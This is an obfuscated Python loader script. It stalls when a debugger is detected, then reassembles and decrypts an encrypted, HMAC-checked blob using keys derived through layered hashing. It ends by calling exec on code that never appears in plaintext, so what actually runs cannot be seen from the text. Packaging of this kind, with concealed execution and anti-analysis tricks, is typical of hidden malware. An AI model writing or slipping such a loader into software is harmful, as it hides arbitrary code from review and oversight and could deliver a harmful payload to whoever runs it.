import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_0bca9a_0 = 'Oh1nPpee4XnXEM7pGYzJ+/s/0PR9UFf5NYejnKNtoageMaQJUD'
_0bca9a_1 = 'u+44VsUTwnDag2DbYFCBY4+bAUQQ=='
_pls = [_0bca9a_0, _0bca9a_1]
_77fce1 = [(34555,42340,2),(63997,5745,2),(49833,51989,2),(47386,297,2),(36539,52184,2),(33298,49730,2),(59029,6828,2),(57775,37512,2),(32316,41265,2),(8237,60981,2),(30052,15160,2),(46106,60476,2),(10968,8915,2),(52685,39569,2),(11243,39323,2),(40424,61672,2),(0,0,0),(0,0,0)]
_9df1f4 = 'I5/vjA=='
_96f0fe = 'JPWaDP/TZfRY9Fxh'
_c88b99 = 'UZF6iy3ZDnQ='
_22283a = [0, 1]
_salt = base64.b64decode(_c88b99)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _22283a
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_fb1353 = base64.b64decode(_assembled)
_e1b05d = 32
_321b3c = _fb1353[:-_e1b05d]
_e1b05d = _fb1353[-_e1b05d:]
_d7ce9f = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_77fce1)
_hdr = base64.b64decode(_9df1f4)
_nonce = base64.b64decode(_96f0fe)
_km_seed = hashlib.sha256(_d7ce9f + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _321b3c, hashlib.sha256).digest()
if _calc_tag != _e1b05d:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_321b3c)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_321b3c, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_c9ff59'] = mmap
globals()['_c10c71'] = lambda i: globals()['_c9ff59'][str(i)]
_x = globals()['_c10c71']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
